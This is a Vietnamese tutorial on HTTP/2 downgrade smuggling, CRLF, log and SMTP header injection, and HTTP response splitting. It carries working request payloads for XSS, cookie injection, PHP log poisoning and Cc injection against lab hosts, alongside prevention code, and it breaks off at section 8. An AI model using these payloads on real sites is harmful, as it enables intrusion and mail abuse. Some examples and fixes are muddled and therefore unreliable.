# MỤC LỤC
1. [Các lỗ hổng HTTP/2](#1-các-lỗ-hổng-http2)  
2. [Các Cuộc Tấn Công HTTP trong Triển Khai Ứng Dụng Web Thực Tế](#2-các-cuộc-tấn-công-http-trong-triển-khai-ứng-dụng-web-thực-tế)  
3. [Tìm Hiểu về CRLF Injection](#3-tìm-hiểu-về-crlf-injection)  
4. [Tìm Hiểu về Log Injection](#4-tìm-hiểu-về-log-injection)  
5. [Tìm Hiểu về HTTP Response Splitting](#5-tìm-hiểu-về-http-response-splitting)  
6. [SMTP Header Injection](#6-smtp-header-injection)  
7. [Phòng chống lỗ hổng CRLF Injection](#7-phòng-chống-lỗ-hổng-crlf-injection)  
8. [Giới thiệu về HTTP Request Smuggling](#8-giới-thiệu-về-http-request-smuggling)  
9. [Khai thác lỗ hổng HTTP Request Smuggling - CL.TE Vulnerability](#9-khai-thác-lỗ-hổng-http-request-smuggling---clte-vulnerability)  
10. [Khai thác lỗ hổng HTTP Request Smuggling - TE.TE Vulnerability](#10-khai-thác-lỗ-hổng-http-request-smuggling---tete-vulnerability)  
11. [Khai thác lỗ hổng HTTP Request Smuggling - TE.CL Vulnerability](#11-khai-thác-lỗ-hổng-http-request-smuggling---tecl-vulnerability)  
12. [Giới thiệu về Lỗ hổng "Vulnerable Software"]( #12-giới-thiệu-về-lỗ-hổng-vulnerable-software)  
13. [Khai thác Lỗ hổng Request Smuggling](#13-khai-thác-lỗ-hổng-request-smuggling)  
14. [Các Công Cụ và Biện Pháp Phòng Ngừa HTTP Request Smuggling](#14-các-công-cụ-và-biện-pháp-phòng-ngừa-http-request-smuggling)  
15. [Giới Thiệu về HTTP/2](#15-giới-thiệu-về-http2)  
16. [Hạ cấp HTTP/2](#16-hạ-cấp-http2)  
17. [Tấn công Smuggling Yêu Cầu HTTP/2 Phức Tạp](#17-tấn-công-smuggling-yêu-cầu-http2-phức-tạp)  
18. [HTTP/2 Downgrading Tools & Prevention](#18-http2-downgrading-tools-prevention)  

---
# 1. Các lỗ hổng HTTP/2 

Trong phần này, chúng ta sẽ tìm hiểu về các lỗ hổng phức tạp hơn liên quan đến HTTP/2 (H2) và cách khai thác chúng để tạo ra tình huống **Request Smuggling** (lừa đảo yêu cầu). Đây là một kiểu tấn công cho phép kẻ tấn công gửi đi các yêu cầu độc hại đến một máy chủ thông qua proxy, nhằm lừa máy chủ xử lý sai yêu cầu.

### Kiến thức nền tảng

HTTP/2 là một giao thức nhị phân, có sự khác biệt rõ rệt so với HTTP/1.1 trong cách biểu diễn dữ liệu. Những khác biệt này dẫn đến cách xử lý các ký tự điều khiển khác nhau, đặc biệt là ký tự **CRLF** (`\r\n`). Trong HTTP/1.1, các ký tự này dùng để kết thúc một header, trong khi ở HTTP/2, chúng không có ý nghĩa đặc biệt. Điều này có thể dẫn đến việc **proxy đảo ngược** (reverse proxy) không xử lý đúng và gây ra lỗ hổng Request Smuggling.

#### H2.TE Vulnerability

Một lỗ hổng điển hình là **H2.TE**, xảy ra khi proxy không kiểm tra kỹ các header HTTP/2 trước khi chuyển đổi sang HTTP/1.1. Hãy xem xét một số ví dụ cụ thể:

### 1. Request Header Injection (Chèn giá trị header)

Nếu proxy không kiểm tra ký tự **CRLF** trong giá trị header HTTP/2, kẻ tấn công có thể chèn các yêu cầu độc hại thông qua một request HTTP/2 như sau:

#### Ví dụ:

**HTTP/2 Request:**
```
:method POST
:path /
:authority http2.htb
:scheme http
dummy asd\r\nTransfer-Encoding: chunked
0

GET /smuggled HTTP/1.1
Host: http2.htb
```

**Mô tả:**
- Kẻ tấn công tạo một header `dummy` với giá trị `asd\r\nTransfer-Encoding: chunked`.
- Ký tự `\r\n` không có ý nghĩa đặc biệt trong HTTP/2, nhưng khi proxy chuyển đổi sang HTTP/1.1, nó sẽ chia header thành hai phần.

**Khi được chuyển sang HTTP/1.1:**
```
POST / HTTP/1.1
Host: http2.htb
Dummy: asd
Transfer-Encoding: chunked
Content-Length: 48

0
GET /smuggled HTTP/1.1
Host: http2.htb
```

**Phân tích:**
- Proxy thêm header `Content-Length`, nhưng server ưu tiên `Transfer-Encoding: chunked`.
- Kết quả là request tiếp theo `GET /smuggled HTTP/1.1` bị xử lý một cách không mong muốn, gây ra lỗ hổng Request Smuggling.

### 2. Header Name Injection (Chèn tên header)

Một vấn đề tương tự xảy ra nếu proxy không kiểm tra tên header HTTP/2 một cách chính xác.

#### Ví dụ:

**HTTP/2 Request:**
```
:method POST
:path /
:authority http2.htb
:scheme http
dummy: asd\r\nTransfer-Encoding chunked
0

GET /smuggled HTTP/1.1
Host: http2.htb
```

**Khi được chuyển sang HTTP/1.1:**
```
POST / HTTP/1.1
Host: http2.htb
Dummy: asd
Transfer-Encoding: chunked
Content-Length: 48

0
GET /smuggled HTTP/1.1
Host: http2.htb
```

**Phân tích:**
- Header `Transfer-Encoding` được thêm vào từ tên header bị chèn (`dummy`).
- Lỗ hổng **H2.TE** xảy ra tương tự như ví dụ trước.

### 3. Request Line Injection (Chèn dòng yêu cầu)

Do các **pseudo-header** trong HTTP/2 có thể được xử lý khác nhau, nếu proxy không kiểm tra các pseudo-header này, có thể dẫn đến Request Smuggling.

#### Ví dụ:

**HTTP/2 Request:**
```
:method POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\nDummy: asd
:path /
:authority http2.htb
:scheme http
0

GET /smuggled HTTP/1.1
Host: http2.htb
```

**Khi được chuyển sang HTTP/1.1:**
```
POST / HTTP/1.1
Transfer-Encoding: chunked
Dummy: asd / HTTP/1.1
Host: http2.htb
Content-Length: 48

0
GET /smuggled HTTP/1.1
Host: http2.htb
```

**Phân tích:**
- Proxy xử lý pseudo-header `:method` sai, dẫn đến việc tạo ra một request độc hại.
- Request tiếp theo `GET /smuggled HTTP/1.1` bị xử lý ngoài ý muốn, gây ra Request Smuggling.

---
# 2. Các Cuộc Tấn Công HTTP trong Triển Khai Ứng Dụng Web Thực Tế

### Giới thiệu
Trong các ứng dụng web hiện đại, các hệ thống trung gian như **reverse proxy (proxy ngược)** thường được sử dụng để tăng hiệu suất và khả năng mở rộng. Tuy nhiên, những hệ thống này cũng có thể tạo ra những lỗ hổng bảo mật do cấu hình sai. Trong bài viết này, chúng ta sẽ tìm hiểu về ba lỗ hổng HTTP phổ biến: **CRLF Injection**, **HTTP Request Smuggling**, và **HTTP/2 Downgrade Attack**. Những lỗ hổng này lợi dụng sự khác biệt giữa các giao thức HTTP hoặc sự thiếu kiểm tra đầu vào.

Hiểu rõ các lỗ hổng này sẽ giúp bạn phát hiện, khai thác và phòng chống chúng hiệu quả. Hãy cùng đi vào chi tiết từng cuộc tấn công.

---

### 1. Tấn Công CRLF Injection

**CRLF Injection** khai thác việc xử lý không đúng các ký tự **Carriage Return (CR)** và **Line Feed (LF)** trong đầu vào người dùng. Các ký tự này (`\r\n`) được sử dụng để kết thúc một dòng trong tiêu đề HTTP và bắt đầu một dòng mới. Nếu một ứng dụng web không lọc các ký tự này, kẻ tấn công có thể chèn các tiêu đề giả mạo hoặc chỉnh sửa phản hồi HTTP.

#### Ví dụ:

Giả sử một ứng dụng web có URL sau:

```
https://example.com/search?q=keyword
```

Nếu đầu vào `q` không được lọc, kẻ tấn công có thể khai thác như sau:

```
https://example.com/search?q=keyword%0D%0ASet-Cookie:%20session=malicious
```

- `%0D%0A` là chuỗi ký tự CRLF.
- Tiêu đề được chèn vào (`Set-Cookie: session=malicious`) khiến server thiết lập cookie độc hại.

**Tác động**:
- Phân tách phản hồi HTTP
- Đầu độc bộ nhớ đệm (Cache Poisoning)
- Cross-Site Scripting (XSS)

**Phòng chống**:
- Kiểm tra và loại bỏ các ký tự CR (`\r`) và LF (`\n`) khỏi đầu vào người dùng.
- Sử dụng các framework web có cơ chế ngăn chặn tự động.

---

### 2. Tấn Công HTTP Request Smuggling (Desync Attacks)

**HTTP Request Smuggling** xảy ra khi có sự khác biệt trong cách một **reverse proxy** và **server backend** diễn giải yêu cầu HTTP. Điều này có thể gây ra hiện tượng **desynchronization (mất đồng bộ)**, cho phép kẻ tấn công vượt qua các biện pháp bảo vệ hoặc chiếm quyền điều khiển phiên của người dùng khác.

#### Ví dụ:

Trong HTTP/1.1, độ dài của phần thân yêu cầu có thể được xác định bằng tiêu đề `Content-Length` hoặc `Transfer-Encoding`.

Yêu cầu sau đây có thể gây ra tấn công:

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 13
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable.com
```

- Proxy ngược sử dụng `Content-Length` (13 byte) và chuyển tiếp phần thân yêu cầu.
- Server backend sử dụng `Transfer-Encoding: chunked` và đọc yêu cầu tiếp theo (`GET /admin`).
- Điều này dẫn đến yêu cầu bị smuggled (bị giấu), cho phép truy cập trái phép.

**Tác động**:
- Truy cập trái phép
- Vượt qua các Web Application Firewall (WAF)
- Chiếm quyền phiên của người dùng

**Phòng chống**:
- Không cho phép sử dụng đồng thời cả `Content-Length` và `Transfer-Encoding` trong cùng một yêu cầu.
- Sử dụng phân tích cú pháp chặt chẽ cho các yêu cầu HTTP tại proxy ngược.

---

### 3. Tấn Công HTTP/2 Downgrade Attack

HTTP/2 mang lại nhiều cải tiến về hiệu suất và bảo mật, bao gồm cả các biện pháp ngăn chặn tấn công request smuggling. Tuy nhiên, do HTTP/2 chưa được hỗ trợ rộng rãi, nhiều hệ thống vẫn chuyển đổi yêu cầu HTTP/2 sang HTTP/1.1 khi giao tiếp với server backend. Việc **downgrade** (hạ cấp) này có thể dẫn đến lỗ hổng nếu proxy ngược không xử lý đúng các tiêu đề HTTP/2.

#### Ví dụ:

Kẻ tấn công gửi một yêu cầu HTTP/2 như sau:

```http
:method POST
:path /
:authority http2.vulnerable.com
:scheme https
dummy asd\r\nTransfer-Encoding: chunked

0
GET /smuggled HTTP/1.1
Host: http2.vulnerable.com
```

- Trong HTTP/2, chuỗi CRLF không có ý nghĩa đặc biệt trong giá trị tiêu đề.
- Proxy ngược chuyển đổi yêu cầu này thành HTTP/1.1:

```http
POST / HTTP/1.1
Host: http2.vulnerable.com
Dummy: asd
Transfer-Encoding: chunked

0
GET /smuggled HTTP/1.1
Host: http2.vulnerable.com
```

- Server backend diễn giải `Transfer-Encoding: chunked`, dẫn đến tấn công request smuggling.

**Tác động**:
- Khai thác các lỗ hổng của HTTP/1.1 ngay cả khi sử dụng HTTP/2 ở frontend.
- Vượt qua các biện pháp bảo mật và truy cập trái phép.

**Phòng chống**:
- Đảm bảo kiểm tra đúng các tiêu đề HTTP/2 trước khi downgrade sang HTTP/1.1.
- Tránh sử dụng phiên bản HTTP hỗn hợp trong cấu hình proxy ngược và server backend.

---
# 3. Tìm Hiểu về CRLF Injection

### 1. CRLF Injection là gì?

**CRLF Injection** là một lỗ hổng bảo mật lợi dụng việc không kiểm tra và lọc ký tự **Carriage Return (CR)** và **Line Feed (LF)** trong đầu vào của người dùng. Hai ký tự này đánh dấu sự kết thúc của một dòng và bắt đầu dòng mới. Khi một ứng dụng web không xử lý đúng các ký tự này, kẻ tấn công có thể chèn thêm dòng mới vào các vị trí nhạy cảm, gây ra những thay đổi không mong muốn trong luồng xử lý dữ liệu.

#### Ký tự CR và LF:
- **CR (Carriage Return)**:
  - Ký tự ASCII: `13` hoặc `0x0D` (hex).
  - Mã hóa URL: `%0D`.
  - Chức năng: Đưa con trỏ về đầu dòng.
- **LF (Line Feed)**:
  - Ký tự ASCII: `10` hoặc `0x0A` (hex).
  - Mã hóa URL: `%0A`.
  - Chức năng: Di chuyển con trỏ xuống dòng mới.

Khi kết hợp lại (`\r\n` hoặc `%0D%0A` trong URL), chúng tạo thành chuỗi **CRLF**, đánh dấu sự bắt đầu của một dòng mới trong các giao thức như **HTTP**, **SMTP**, hoặc khi ghi vào file log.

### 2. Các Ngữ Cảnh Dễ Bị Tấn Công CRLF Injection

CRLF Injection có thể xảy ra khi đầu vào từ người dùng không được lọc và được sử dụng trong các ngữ cảnh nhạy cảm, bao gồm:
- **Tiêu đề HTTP (HTTP Headers)**: Ví dụ như `Set-Cookie`, `Location`, hoặc `Content-Type`.
- **File Log**: Khi thông tin được ghi vào log mà không kiểm tra đầu vào.
- **Tiêu đề SMTP**: Dùng trong các email, có thể bị lợi dụng để thay đổi nội dung email hoặc giả mạo người gửi.

### 3. Tác Động của CRLF Injection

Mặc dù bản thân ký tự CR và LF không gây hại, nhưng chúng có thể thay đổi ý nghĩa của thông điệp và dẫn đến các cuộc tấn công phức tạp hơn. Dưới đây là một số kịch bản và tác động phổ biến:

#### a. **HTTP Header Injection**
- **Mô tả**: Nếu một ứng dụng phản hồi với dữ liệu từ người dùng mà không lọc các ký tự CRLF, kẻ tấn công có thể chèn các tiêu đề HTTP mới.
- **Ví dụ**:
  ```http
  GET /search?q=abc%0D%0ASet-Cookie:%20session=malicious HTTP/1.1
  Host: vulnerable.com
  ```
  - Yêu cầu trên sẽ chèn tiêu đề mới `Set-Cookie`, tạo ra cookie độc hại `session=malicious`.

- **Tác động**:
  - **XSS Phản Chiếu (Reflected XSS)**: Kẻ tấn công có thể chèn mã JavaScript vào phản hồi HTTP.
  - **Đầu độc bộ nhớ đệm (Cache Poisoning)**: Làm sai lệch dữ liệu được lưu trong bộ nhớ đệm, ảnh hưởng đến nhiều người dùng.

#### b. **Log Forgery (Giả Mạo File Log)**
- **Mô tả**: Nếu các ký tự CRLF được chèn vào file log, kẻ tấn công có thể tạo ra các bản ghi giả mạo.
- **Tác động**:
  - **Gây Nhiễu File Log**: Làm sai lệch thông tin, khiến quản trị viên khó xác định các sự kiện thực tế.
  - **Che Giấu Dấu Vết**: Kẻ tấn công có thể che giấu các hành động độc hại bằng cách chèn các bản ghi giả.

#### c. **SMTP Header Injection**
- **Mô tả**: Trong email, các tiêu đề như `From`, `Subject`, và `To` được phân tách bằng chuỗi CRLF. Nếu đầu vào từ người dùng không được kiểm tra, kẻ tấn công có thể chèn các tiêu đề SMTP mới.
- **Ví dụ**:
  ```
  From: victim@example.com%0D%0ASubject: You are hacked
  ```
  - Email có thể chứa các tiêu đề không mong muốn, dẫn đến việc giả mạo email.

- **Tác động**:
  - **Email Spoofing (Giả Mạo Email)**: Gửi email dưới dạng người dùng khác.
  - **Phishing**: Lừa đảo người dùng thông qua email giả mạo.

---
# 4. Tìm Hiểu về Log Injection

### 1. Log Injection là gì?

Trong các ứng dụng web, thông tin từ yêu cầu của người dùng thường được ghi lại trong **file log**. Những thông tin này bao gồm:
- Địa chỉ IP của người gửi yêu cầu.
- Đường dẫn yêu cầu.
- Các tham số của yêu cầu.

Mục đích chính của việc ghi log là giúp cho việc **gỡ lỗi** và **phân tích bảo mật** dễ dàng hơn khi có sự cố xảy ra. Một số ứng dụng còn tích hợp **Web Application Firewall (WAF)** để ghi lại các yêu cầu có dấu hiệu đáng ngờ, chẳng hạn khi chứa các ký tự đặc biệt nhằm khai thác lỗ hổng.

**Log Injection** là một loại tấn công xảy ra khi đầu vào từ người dùng không được lọc các ký tự đặc biệt như **Carriage Return (CR)** và **Line Feed (LF)** trước khi ghi vào file log. Điều này có thể cho phép kẻ tấn công:
- **Giả mạo bản ghi log** để tạo ra các dòng log không có thật.
- **Poison Log** để thực thi mã độc, có thể dẫn đến **Remote Code Execution (RCE)**.

### 2. Nhận diện Lỗ Hổng Log Injection

Hãy xem xét ví dụ dưới đây, một ứng dụng web đơn giản có form liên hệ (contact form). Form này cho phép người dùng gửi thông tin bao gồm tên, email, số điện thoại, và tin nhắn. Ứng dụng có ghi lại các yêu cầu đáng ngờ vào file log, tương tự như cách hoạt động của một WAF.

#### Ví dụ 1: Yêu cầu HTTP với Payload SQL Injection
```http
POST /contact.php HTTP/1.1
Host: loginjection.htb
Content-Length: 66
Content-Type: application/x-www-form-urlencoded

name=testuser&email=test%40htb.com&phone=123&message=test'+--+
```

Yêu cầu trên sẽ bị chặn bởi bộ lọc vì có chứa payload **SQL Injection** (`'--+`).

Ứng dụng này cũng có một endpoint là `/log.php` để hiển thị nội dung file log, giúp quản trị viên theo dõi các yêu cầu đáng ngờ. Tuy nhiên, nếu file log được lưu trong thư mục hiện tại và không được bảo vệ đúng cách, nó có thể truy cập công khai.

#### Kiểm Tra Lỗ Hổng Bằng Chuỗi CRLF
Chúng ta có thể kiểm tra lỗ hổng bằng cách chèn chuỗi ký tự CRLF (`%0d%0a`) vào tin nhắn:

```http
POST /contact.php HTTP/1.1
Host: loginjection.htb
Content-Length: 73
Content-Type: application/x-www-form-urlencoded

name=testuser&email=test%40htb.com&phone=123&message=test1'%0d%0atest2
```

Khi yêu cầu này được ghi vào file log, nó sẽ tạo ra một dòng mới, chứng tỏ rằng chuỗi CRLF không được lọc. Điều này có nghĩa là chúng ta đã thành công chèn một dòng mới vào file log.

### 3. Khai Thác Lỗ Hổng Log Injection

#### a. **Giả Mạo File Log (Log Forgery)**
Với một lỗ hổng Log Injection đơn giản, kẻ tấn công có thể giả mạo bản ghi log, khiến cho quản trị viên nhầm lẫn về hành động của người dùng.

**Ví dụ**:
```http
POST /contact.php HTTP/1.1
Host: 172.17.0.2
Content-Length: 124
Content-Type: application/x-www-form-urlencoded

name=testuser&email=testuser%40test.htb&phone=123&message=test1';%0a%0dMalicious+message+from+admin+(127.0.0.1):+'+OR1=1+--+
```

Khi yêu cầu này được ghi vào file log, sẽ có thêm một dòng giả mạo:
```
Malicious message from admin (127.0.0.1): ' OR 1=1 --
```

Kết quả là file log đã bị thay đổi, khiến cho quản trị viên không thể phân biệt được bản ghi nào là thật và bản ghi nào là giả mạo.

#### b. **Log Poisoning để Thực Thi Mã (RCE)**
Trong một số trường hợp, nếu ứng dụng ghi trực tiếp đầu vào của người dùng vào file log mà không lọc các ký tự đặc biệt, kẻ tấn công có thể chèn mã PHP vào log file. Điều này có thể dẫn đến **Remote Code Execution (RCE)** nếu ứng dụng có lỗ hổng **Local File Inclusion (LFI)**.

**Ví dụ**:
```http
POST /contact.php HTTP/1.1
Host: 172.17.0.2
Content-Length: 80
Content-Type: application/x-www-form-urlencoded

name=testuser&email=testuser%40test.htb&phone=123&message=<?php+echo+'pwned';+?>
```

Nếu log file này sau đó được truy cập qua LFI, mã PHP sẽ được thực thi, in ra chuỗi `"pwned"`.

**Lưu ý**: Trong thực tế, các bộ lọc thường được triển khai để ngăn chặn mã độc. Kẻ tấn công có thể cần sử dụng các kỹ thuật **bypass** để vượt qua bộ lọc.

---
# 5. Tìm Hiểu về HTTP Response Splitting

### 1. HTTP Response Splitting là gì?

**HTTP Response Splitting** là một lỗ hổng bảo mật nghiêm trọng xảy ra khi một ứng dụng web phản hồi lại dữ liệu từ người dùng trong **HTTP headers** mà không thực hiện lọc đúng cách. Bằng cách chèn chuỗi ký tự đặc biệt **CRLF** (`%0d%0a`), kẻ tấn công có thể phá vỡ cấu trúc của HTTP header và chèn thêm các header tuỳ ý hoặc thậm chí thay đổi toàn bộ nội dung phản hồi. Điều này có thể dẫn đến:
- **XSS phản chiếu** (Reflected XSS).
- **Web cache poisoning**.
- Bỏ qua các cơ chế bảo mật như **Content-Security-Policy (CSP)** hoặc **Clickjacking protection**.

### 2. Nhận diện Lỗ Hổng HTTP Response Splitting

Giả sử chúng ta có một ứng dụng web đơn giản cho phép người dùng cung cấp một URL đích để chuyển hướng. Ứng dụng sẽ sử dụng header `Refresh` để điều hướng người dùng đến URL được cung cấp sau 2 giây.

Ví dụ yêu cầu HTTP:
```http
GET /?target=http://hackthebox.com HTTP/1.1
Host: responsesplitting.htb
```

Khi gửi yêu cầu này, server sẽ phản hồi với header:
```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Refresh: 2; URL=http://hackthebox.com
```

Nếu ứng dụng không lọc đúng cách chuỗi CRLF (`%0d%0a`), kẻ tấn công có thể chèn thêm header tùy ý.

#### Ví dụ kiểm tra lỗ hổng bằng CRLF
Yêu cầu HTTP:
```http
GET /?target=http%3A%2F%2Fhackthebox.com%0d%0aTest:%20test HTTP/1.1
Host: responsesplitting.htb
```

Phản hồi từ server:
```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Refresh: 2; URL=http://hackthebox.com
Test: test
```

Trong phản hồi trên, có thể thấy header `Test: test` đã được chèn vào, chứng minh rằng lỗ hổng **HTTP Response Splitting** tồn tại.

### 3. Khai Thác Lỗ Hổng HTTP Response Splitting

#### a. **Reflected XSS với Payload HTML**
Chúng ta có thể tận dụng lỗ hổng này để thực hiện tấn công **Reflected XSS**. Để khai thác, kẻ tấn công cần chèn hai chuỗi CRLF (`%0d%0a%0d%0a`) để kết thúc phần header và bắt đầu phần body của phản hồi.

**Ví dụ yêu cầu HTTP**:
```http
GET /?target=http%3A%2F%2Fhackthebox.com%0d%0a%0d%0a<html><script>alert(1)</script></html> HTTP/1.1
Host: responsesplitting.htb
```

Phản hồi từ server:
```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8

<html><script>alert(1)</script></html>
```

Khi trình duyệt nhận được phản hồi này, mã JavaScript sẽ được thực thi và hiển thị thông báo `alert(1)`, chứng minh rằng tấn công XSS đã thành công.

#### b. **Khai thác HTTP 302 Redirect**
Trong nhiều trường hợp, ứng dụng web sử dụng header `Location` để điều hướng người dùng với mã trạng thái HTTP 302. Khi đó, trình duyệt sẽ tự động chuyển hướng mà không hiển thị nội dung phản hồi, do đó payload XSS sẽ không được thực thi.

**Ví dụ yêu cầu HTTP không thành công**:
```http
GET /?target=http%3A%2F%2Fhackthebox.com%0d%0a%0d%0a<html><script>alert(1)</script></html> HTTP/1.1
Host: responsesplitting.htb
```

Trình duyệt sẽ chuyển hướng mà không thực thi mã JavaScript. Tuy nhiên, kẻ tấn công có thể vượt qua điều này bằng cách cung cấp một header `Location` rỗng.

**Ví dụ khai thác với header `Location` rỗng**:
```http
GET /?target=%0d%0a%0d%0a<html><script>alert(1)</script></html> HTTP/1.1
Host: responsesplitting.htb
```

Phản hồi từ server:
```http
HTTP/1.1 302 Found
Location: 

<html><script>alert(1)</script></html>
```

Trình duyệt không biết phải chuyển hướng đến đâu, nên hiển thị nội dung phản hồi và thực thi mã XSS.

### 4. Khả năng Tấn công Khác
HTTP Response Splitting không chỉ được sử dụng để thực hiện tấn công XSS mà còn có thể khai thác theo nhiều cách khác, bao gồm:

- **Web Cache Poisoning**: Kẻ tấn công có thể chèn các header độc hại vào phản hồi để làm nhiễm độc bộ nhớ đệm của web server, khiến tất cả người dùng truy cập sau đó nhận được nội dung độc hại.
- **Bỏ Qua Các Cơ Chế Bảo Mật**: Kẻ tấn công có thể chèn các header tuỳ ý như:
  - Xoá bỏ header bảo vệ **Content-Security-Policy (CSP)**.
  - Vô hiệu hoá header bảo vệ **Clickjacking**.

---
# 6. SMTP Header Injection

SMTP Header Injection (còn gọi là Email Injection) là một lỗ hổng bảo mật cho phép kẻ tấn công tiêm vào các header SMTP thông qua đầu vào người dùng. SMTP (**Simple Mail Transfer Protocol**) là giao thức được sử dụng để gửi email. Các header của SMTP được ngăn cách bởi ký tự xuống dòng (CRLF). Khi dữ liệu người dùng không được lọc đúng cách, kẻ tấn công có thể lợi dụng điều này để thực hiện tấn công CRLF Injection nhằm chèn các header SMTP tùy ý.

### 1. **Cấu trúc của SMTP Headers**

Một email SMTP điển hình gồm hai phần chính:
- **Header**: Chứa thông tin như người gửi, người nhận, tiêu đề, v.v.
- **Body**: Nội dung chính của email.

Ví dụ về một email SMTP đơn giản:

```
From: [email protected]
To: [email protected]
Cc: [email protected]
Subject: Testmail

Đây là nội dung của email.
.
```

Các header quan trọng trong SMTP bao gồm:
- `From`: Địa chỉ người gửi.
- `To`: Địa chỉ người nhận.
- `Cc`: Carbon copy, gửi bản sao đến một người nhận khác.
- `Bcc`: Blind carbon copy, gửi bản sao nhưng không hiển thị người nhận khác.
- `Subject`: Tiêu đề email.

### 2. **Phát hiện lỗ hổng SMTP Header Injection**

Khi một ứng dụng web có chức năng gửi email và cho phép người dùng nhập thông tin vào các trường như địa chỉ email, tên, hoặc tiêu đề, chúng ta cần kiểm tra xem dữ liệu người dùng có được lọc đúng cách hay không.

Ví dụ về yêu cầu HTTP kiểm tra lỗ hổng:

```http
POST /contact.php HTTP/1.1
Host: smtpinjection.htb
Content-Length: 105
Content-Type: application/x-www-form-urlencoded

name=evilhacker&[email protected]%0d%0aTestheader:%20Testvalue&phone=123456789&message=Hello+Admin%21
```

Trong ví dụ trên:
- `%0d%0a` là chuỗi CRLF (Carriage Return và Line Feed).
- Chúng ta đã chèn một header tùy ý (`Testheader: Testvalue`) vào email.

Nếu yêu cầu này được phản hồi và header `Testheader: Testvalue` được thêm vào email, ứng dụng có lỗ hổng SMTP Header Injection.

### 3. **Khai thác SMTP Header Injection**

#### **3.1. Thêm người nhận vào email**

Khi không thể xem được email kết quả, kẻ tấn công có thể thử thêm email của mình vào danh sách người nhận để kiểm tra:

```http
POST /contact.php HTTP/1.1
Host: smtpinjection.htb
Content-Length: 107
Content-Type: application/x-www-form-urlencoded

name=evilhacker&[email protected]%0d%0aCc:%[email protected]&phone=123456789&message=Hello+Admin%21
```

Nếu email được gửi đến `[email protected]`, thì lỗ hổng đã được xác nhận. Điều này có thể dẫn đến:
- **Đánh cắp thông tin nhạy cảm**: Kẻ tấn công nhận được nội dung email gốc.
- **Gửi spam**: Kẻ tấn công có thể chèn một danh sách email lớn vào trường `To`, `Cc`, hoặc `Bcc`.

#### **3.2. Chèn thêm header tùy ý**

Nếu ứng dụng thêm dữ liệu vào sau đầu vào của người dùng (ví dụ: thêm dấu chấm than `!`), kẻ tấn công cần phải chèn một header giả sau payload chính để tránh việc payload bị phá vỡ:

```http
POST /contact.php HTTP/1.1
Host: smtpinjection.htb
Content-Length: 151
Content-Type: application/x-www-form-urlencoded

name=evilhacker&email=evil%40attacker.htb%0d%0aCc:%[email protected]%0d%0aDummyheader:%20abc&phone=123456789&message=Hello+Admin%21
```

Payload trên sẽ đảm bảo header `Cc` được chèn đúng cách, tránh trường hợp payload bị hỏng bởi ký tự bổ sung.

---
# 7. Phòng chống lỗ hổng CRLF Injection

Việc phòng chống các lỗ hổng **CRLF Injection** là vô cùng quan trọng để đảm bảo an toàn cho hệ thống. Sau đây là một số phương pháp phòng chống mà bạn có thể áp dụng:

### 1. Cấu hình bảo mật an toàn

Lỗ hổng **CRLF Injection** có thể xảy ra ở bất kỳ vị trí nào mà chuỗi ký tự **CRLF** (`\r\n`) có ý nghĩa đặc biệt, như:
- Ghi log (Log files)
- Header trong HTTP hoặc SMTP

### 2. Ngăn chặn **Log Injection**

Ví dụ dưới đây minh họa một lỗ hổng **Log Injection**:

```php
function log_msg($ip, $user_agent, $msg) {
    global $LOGFILE;
    $log_msg = "Request from " . $ip . " (" . $user_agent . "): " . $msg;
    file_put_contents($LOGFILE, $log_msg, FILE_APPEND | LOCK_EX);
}
log_msg($_SERVER['REMOTE_ADDR'], $_SERVER['HTTP_USER_AGENT'], $_POST['msg']);
```

#### Ngăn chặn:
- **Sử dụng chức năng ghi log có sẵn của web server**.
- **Mã hóa URL** cho các tham số đầu vào từ người dùng trước khi ghi vào file log:

```php
function log_msg($ip, $user_agent, $msg) {
    global $LOGFILE;
    $log_msg = "Request from " . urlencode($ip) . " (" . urlencode($user_agent) . "): " . urlencode($msg);
    file_put_contents($LOGFILE, $log_msg, FILE_APPEND | LOCK_EX);
}
```

### 3. Phòng chống **HTTP Response Splitting**

Trước đây, trong PHP, việc sử dụng hàm `header()` có thể gây ra lỗ hổng **HTTP Response Splitting**:

```php
header("Location: " . $_GET['url']);
```

#### Cách khắc phục:
- **Không chèn trực tiếp dữ liệu người dùng vào header**.
- **Mã hóa URL** các tham số đầu vào:

```php
header("Location: " . urlencode($_GET['url']));
```

- Sử dụng PHP từ phiên bản 5.1.2 trở lên, vì lỗi này đã được khắc phục trong các phiên bản mới.

### 4. Ngăn chặn **SMTP Header Injection**

SMTP Header Injection là một biến thể của CRLF Injection, thường xảy ra khi sử dụng các hàm gửi email mặc định trong PHP:

```php
$to = "admin@example.com";
$subject = "You received a message";
$message = "Here is the message:\r\n" . $_POST['message'];
$user_mail = $_POST['email'];
$headers = "From: " . $user_mail . "\r\n";
$headers .= "Reply-To: reply@example.com\r\n";
mail($to, $subject, $message, $headers);
```

#### Cách khắc phục:
- **Không sử dụng trực tiếp dữ liệu người dùng trong header**.
- **Mã hóa URL** cho dữ liệu đầu vào:

```php
$to = "admin@example.com";
$subject = "You received a message";
$message = "Here is the message:\r\n" . $_POST['message'];
$user_mail = $_POST['email'];
$headers = "From: " . urlencode($user_mail) . "\r\n";
$headers .= "Reply-To: reply@example.com\r\n";
mail($to, $subject, $message, $headers);
```

### 5. Sử dụng công cụ kiểm tra lỗ hổng **CRLF Injection**

Một công cụ hữu ích để phát hiện lỗ hổng **CRLF Injection** là **CRLFsuite**. Bạn có thể cài đặt công cụ này bằng lệnh sau:

```bash
pip3 install crlfsuite
```

#### Sử dụng:

```bash
crlfsuite -t http://example.com/?param=value
```

Các tùy chọn phổ biến:

- `-t`: Chỉ định URL mục tiêu.
- `-m`: Chỉ định phương thức HTTP (`GET` hoặc `POST`).
- `-c`: Thêm cookie nếu cần thiết.
- `-v`: Mức độ chi tiết khi quét (`1`, `2`, `3`).
- `-sL`: Chế độ im lặng (Silent mode).

#### Ví dụ:

```bash
crlfsuite -t http://127.0.0.1:8000/?target=asd
```

Kết quả sẽ hiển thị các điểm có thể khai thác:

```plaintext
[VLN] http://127.0.0.1:8000/?target=%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert('XSS')</script>
```

---
# 8. Giới thiệu về HTTP Request Smuggling

